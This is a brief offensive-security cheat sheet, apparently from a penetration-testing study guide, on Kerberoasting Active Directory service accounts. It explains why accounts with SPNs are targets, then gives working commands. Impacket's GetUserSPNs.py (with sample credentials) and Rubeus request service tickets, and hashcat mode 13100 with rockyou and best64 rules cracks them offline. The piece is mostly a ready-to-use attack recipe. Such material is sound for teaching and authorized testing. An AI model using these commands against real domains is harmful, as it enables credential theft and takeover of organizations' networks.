

What & why

**Service accounts (any account with an "SPN") can be targeted by any logged-in user.** You request a service ticket for them, and part of that ticket is encrypted with the service account's password — so you crack it offline. These accounts often have weak, never-rotated passwords, making this one of the most reliable AD wins. **Prerequisite:** valid domain creds (you have them) + an SPN account (BloodHound → "Find Kerberoastable Users"). Add `best64.rule` to hashcat for tougher passwords.

```
GetUserSPNs.py corp.local/stephanie:'Password123' \
    -dc-ip 192.168.x.100 -request -outputfile kerb.txt

# Windows (Rubeus):
.\Rubeus.exe kerberoast /format:hashcat /outfile:kerb.txt

# Crack:
hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt
hashcat -m 13100 kerb.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```